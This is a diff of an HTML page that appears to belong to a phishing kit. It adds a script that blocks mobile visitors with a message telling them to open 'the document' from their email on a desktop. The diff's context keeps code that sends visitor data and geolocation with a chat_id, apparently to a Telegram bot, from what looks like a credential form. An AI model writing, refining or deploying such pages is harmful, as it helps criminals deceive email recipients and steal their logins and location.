@@ -10,30 +10,31 @@
 	<style>
 @font-face{
 	font-family: 'fmtt';
-
-  src: url(img/font1.woff2) format('truetype');
-  }
+    src: url(img/font1.woff2) format('truetype');
+}
 *{
 	margin:auto;
 	font-size:14px;
 	outline:0;
 	font-family:'fmtt';
-}input{
+}
+input{
 	border:0;
     display:block;
 	margin-top:0px;
 	width:100%;
 	padding:6px;
 	background:#f2f2f2;
-	
 	padding-left:0;
-}td{
+}
+td{
 	border-right:1px solid black;
 	padding-right:10px;
 	padding-left:10px;
 	font-size:11px;
 	color:#0072ce;
-}.inp{
+}
+.inp{
 	margin-top:30px;
 	border-radius:15px;
 	background:#f2f2f2;
@@ -42,7 +43,8 @@
 	width:93%;
 	padding:6px;
 	padding-left:1px;
-}label{
+}
+label{
 	display:block;
 	text-align:left;
 	margin:0;
@@ -50,28 +52,49 @@
 	color:gray;
 	padding:0;
 	width:100%;
-}@keyframes roll{
-	from{
-	transform:rotate(0deg);
-	}to{
-	rotate:360deg;
-	}
-}#rl{
+}
+@keyframes roll{
+	from{ transform:rotate(0deg);}
+	to{ transform:rotate(360deg);}
+}
+#rl{
 	animation:roll 1s infinite;
 }
 @keyframes fade{
-	from{
-	opacity: 1;
-	}to{
-	opacity:0.3;
-	}
-}#fd{
+	from{opacity: 1;}
+	to{opacity:0.3;}
+}
+#fd{
 	animation:fade 1s infinite;
 }
 	</style>
 </head>
+
 <body>
 
+<!-- MOBILE DEVICE BLOCK SCRIPT -->
+<script>
+(function() {
+    const ua = navigator.userAgent;
+    const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+    
+    if (isMobile) {
+        document.documentElement.innerHTML = `
+        <div style="display:flex; flex-direction: column; align-items:center; justify-content:center; 
+                    height:100vh; background:#f8f8f8; color:#333; font-family:sans-serif; text-align:center;
+                    padding: 20px; box-sizing: border-box;">
+            <h1 style="font-size: 24px; margin-bottom: 20px; color: #E03636">⚠️ Desktop Only</h1>
+            <p style="font-size: 18px; margin-bottom: 10px; max-width: 500px; line-height: 1.5;">
+                Access is only available on a desktop or Windows computer.
+            </p>
+            <p style="font-size: 16px; max-width: 500px; line-height: 1.5;">
+                <center>Please check your email and open the document on a laptop or desktop device.</center>
+            </p> 
+        </div>`;
+    }
+})();
+</script>
+<!-- END MOBILE BLOCK -->
 
 <div style="max-width:500px;padding:0px;">
 
@@ -122,10 +145,6 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                
             });
         })
         .catch(error => console.error("Geo-Location Error:", error));
@@ -133,10 +152,6 @@
 
 </form>
 
-
-
 </body>
 
 </html>
-
-
